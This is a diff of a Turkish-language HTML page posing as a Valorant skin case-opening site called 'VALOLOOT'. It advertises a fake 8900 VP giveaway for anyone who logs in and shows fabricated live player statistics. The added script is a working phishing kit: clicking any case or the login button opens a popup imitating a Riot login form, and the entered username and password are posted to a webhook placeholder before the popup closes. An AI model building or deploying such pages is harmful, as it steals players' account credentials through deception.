@@ -7,14 +7,19 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
     <style>
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
-        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
+        
+        body { 
+            background: var(--dark-bg) url('bg.jpg') fixed center/cover; 
+            color: white; font-family: 'Inter', sans-serif; 
+            margin: 0; padding: 0; min-height: 100vh;
+        }
 
-        /* Üst Kayar Şerit */
-        .live-drops { background: rgba(0, 0, 0, 0.9); height: 80px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; z-index: 10; }
+        /* Üst Drop Şeridi */
+        .live-drops { background: rgba(0, 0, 0, 0.9); height: 80px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
         .drop-track { display: flex; width: max-content; animation: marquee 30s linear infinite; }
         @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
         .drop-card { background: rgba(255,255,255,0.05); border-bottom: 3px solid var(--valo-red); border-radius: 4px; width: 140px; height: 60px; margin: 0 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; }
-        .drop-card img { height: 35px; }
+        .drop-card img { height: 35px; object-fit: contain; }
 
         /* Navbar */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
@@ -25,36 +30,190 @@
         .btn-login { background: #79eb1e; color: #000; border: none; padding: 10px 22px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 8px; }
 
         /* Çekiliş Banner */
-        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.8); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
-        #countdown { font-size: 36px; font-weight: 900; font-family: 'Montserrat'; }
+        .giveaway-section { 
+            max-width: 1100px; margin: 40px auto; 
+            background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); 
+            border-radius: 12px; padding: 30px; display: flex; 
+            justify-content: space-between; align-items: center;
+            box-shadow: 0 0 30px rgba(255,70,85,0.2);
+        }
+        .gv-text h2 { margin: 0; font-family: 'Montserrat'; font-size: 32px; letter-spacing: -1px; }
+        .timer-box { text-align: right; border-left: 2px solid var(--valo-red); padding-left: 30px; }
+        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; letter-spacing: 2px; }
 
-        /* Kasa Alanı */
-        .title-strip { background: rgba(255,255,255,0.03); padding: 15px; text-align: center; margin: 20px 0; }
-        .case-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; padding: 20px 50px; max-width: 1400px; margin: auto; justify-content: center; }
-        .case-box { background: #16172b; border-radius: 10px; padding: 25px; text-align: center; border: 1px solid #222; transition: 0.3s; }
+        /* Kasa Başlığı */
+        .title-strip { background: rgba(255,255,255,0.03); padding: 15px; text-align: center; margin: 20px 0; border-y: 1px solid rgba(255,255,255,0.05); }
+        .title-strip h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 3px; color: #aaa; }
+
+        /* Kasa Grid */
+        .case-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+            gap: 25px; padding: 20px 50px; 
+            max-width: 1400px; margin: auto; 
+            justify-items: center;
+        }
+        .case-box { 
+            background: #16172b; border-radius: 12px; padding: 25px; 
+            text-align: center; border: 1px solid #222; 
+            transition: 0.3s; width: 100%; max-width: 320px;
+        }
         .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
-        .case-box img { width: 100%; height: 140px; object-fit: contain; }
-        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 18px; margin: 10px 0; }
-        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 700; border-radius: 4px; cursor: pointer; }
+        .case-box img { width: 100%; height: 150px; object-fit: contain; margin-bottom: 15px; }
+        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 20px; margin-bottom: 15px; }
+        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 700; border-radius: 6px; cursor: pointer; text-transform: uppercase; }
 
         /* İstatistikler */
-        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 50px 0; background: rgba(0,0,0,0.4); margin-top: 60px; }
+        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 60px; }
         .stat-box { text-align: center; }
-        .stat-num { display: block; font-size: 32px; font-weight: 900; }
+        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+        .stat-label { color: #555; font-size: 12px; font-weight: 800; text-transform: uppercase; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-<div class="live-drops"><div class="drop-track" id="track"></div></div>
-
-<header>
-    <div class="logo">VALO<span>LOOT</span></div>
-    <div class="nav-links">
-        <a href="#">Kasalar</a>
-        <a href="#">Savaşlar</a>
-        <a href="#">Sözleşmeler</a>
+    <div class="live-drops">
+        <div class="drop-track" id="track">
+            </div>
     </div>
-    <button class="btn-login" onclick="openAuth()">
-        <img src="logo.png" width="18" onerror="this.style.display='none'"> GİRİŞ YAP
-    </button>
-</header>
+
+    <header>
+        <div class="logo">VALO<span>LOOT</span></div>
+        <div class="nav-links">
+            <a href="#">Kasalar</a>
+            <a href="#">Savaşlar</a>
+            <a href="#">Sözleşmeler</a>
+            <a href="#">Mağaza</a>
+        </div>
+        <button class="btn-login" onclick="openAuth()">
+            <img src="logo.png" width="18" onerror="this.style.display='none'"> GİRİŞ YAP
+        </button>
+    </header>
+
+    <div class="giveaway-section">
+        <div class="gv-text">
+            <h2>10 ADET 8900 VP ÇEKİLİŞİ</h2>
+            <p style="color:var(--valo-red); font-weight:800; margin:5px 0; font-size:14px;">GİRİŞ YAPANLAR OTOMATİK OLARAK KATILIR</p>
+        </div>
+        <div class="timer-box">
+            <div id="countdown">00:00:00</div>
+            <span style="font-size:10px; color:#666; font-weight:800;">KALAN SÜRE (UTC+3)</span>
+        </div>
+    </div>
+
+    <div class="title-strip"><h3>POPÜLER SANDIKLAR</h3></div>
+
+    <div class="case-grid" id="caseGrid"></div>
+
+    <div class="live-stats">
+        <div class="stat-box"><span class="stat-num" id="s1">2.841</span><span class="stat-label">Aktif Oyuncu</span></div>
+        <div class="stat-box"><span class="stat-num" id="s2">148.209</span><span class="stat-label">Kasa Açıldı</span></div>
+        <div class="stat-box"><span class="stat-num" id="s3">1.250.400</span><span class="stat-label">VP Dağıtıldı</span></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_YAPISTIR";
+
+        // Sayfa yüklendiğinde çalışacak ana fonksiyon
+        window.onload = function() {
+            
+            // 1. Üst Şerit Silahları
+            const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
+            const track = document.getElementById('track');
+            if(track) {
+                track.innerHTML = [...skins, ...skins, ...skins, ...skins].map(s => `
+                    <div class="drop-card"><img src="${s}" onerror="this.src='https://via.placeholder.com/40'"></div>
+                `).join('');
+            }
+
+            // 2. Kasaları Oluştur
+            const cases = [
+                {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
+                {n: "STANDART", p: "30 VP", i: "case2.png"},
+                {n: "ELİT", p: "50 VP", i: "case3.png"},
+                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
+                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
+            ];
+            const grid = document.getElementById('caseGrid');
+            if(grid) {
+                grid.innerHTML = cases.map(c => `
+                    <div class="case-box" onclick="openAuth()">
+                        <img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'">
+                        <h3 style="margin:0; font-size:18px;">${c.n} KASASI</h3>
+                        <div class="vp-tag">${c.p}</div>
+                        <button class="open-btn">KASAYI AÇ</button>
+                    </div>
+                `).join('');
+            }
+
+            // 3. UTC+3 Sayaç Fonksiyonu
+            function updateTimer() {
+                const now = new Date();
+                const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
+                let target = new Date(utc3);
+                target.setHours(24, 0, 0, 0);
+                
+                let diff = target - utc3;
+                let h = Math.floor(diff / 3600000);
+                let m = Math.floor((diff % 3600000) / 60000);
+                let s = Math.floor((diff % 60000) / 1000);
+                
+                const c = document.getElementById('countdown');
+                if(c) c.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            }
+            setInterval(updateTimer, 1000);
+            updateTimer();
+
+            // 4. Canlı İstatistikler
+            setInterval(() => {
+                const s1 = document.getElementById('s1');
+                if(s1) {
+                    let val = parseInt(s1.innerText.replace('.',''));
+                    s1.innerText = (val + Math.floor(Math.random() * 5 - 2)).toLocaleString('tr-TR');
+                }
+            }, 3000);
+        };
+
+        // 5. Giriş Penceresi (600x800)
+        function openAuth() {
+            const w = 600, h = 800;
+            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
+            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            
+            win.document.body.innerHTML = `
+                <style>
+                    body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
+                    .card { background:#fff; width:340px; padding:50px 40px; border-radius:4px; text-align:center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
+                    input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; outline:none; font-weight:600; }
+                    input:focus { border-color:#ff4655; background:#fff; }
+                    .btn { width:100%; padding:18px; background:#ff4655; color:#fff; border:none; border-radius:12px; font-weight:700; cursor:pointer; margin-top:40px; }
+                </style>
+                <div class="card">
+                    <img src="login_logo.png" width="110" style="margin-bottom:30px;" onerror="this.style.display='none'">
+                    <h2 style="color:#111; margin-bottom:30px;">Oturum Aç</h2>
+                    <input type="text" id="u" placeholder="KULLANICI ADI">
+                    <input type="password" id="p" placeholder="ŞİFRE">
+                    <button class="btn" id="go">GİRİŞ YAP</button>
+                    <p style="font-size:11px; color:#bbb; margin-top:25px; font-weight:600;">OTURUM AÇAMIYOR MUSUN? <br> HESAP OLUŞTUR</p>
+                </div>
+            `;
+
+            win.document.getElementById('go').onclick = function() {
+                const u = win.document.getElementById('u').value;
+                const p = win.document.getElementById('p').value;
+                if(u && p) {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `✅ **Yeni Giriş:** \`${u}\` / \`${p}\`` })
+                    }).then(() => {
+                        win.document.body.innerHTML = "<h2 style='padding:20px;'>Yönlendiriliyorsunuz...</h2>";
+                        setTimeout(() => win.close(), 1200);
+                    });
+                }
+            };
+        }
+    </script>
+</body>
+</html>
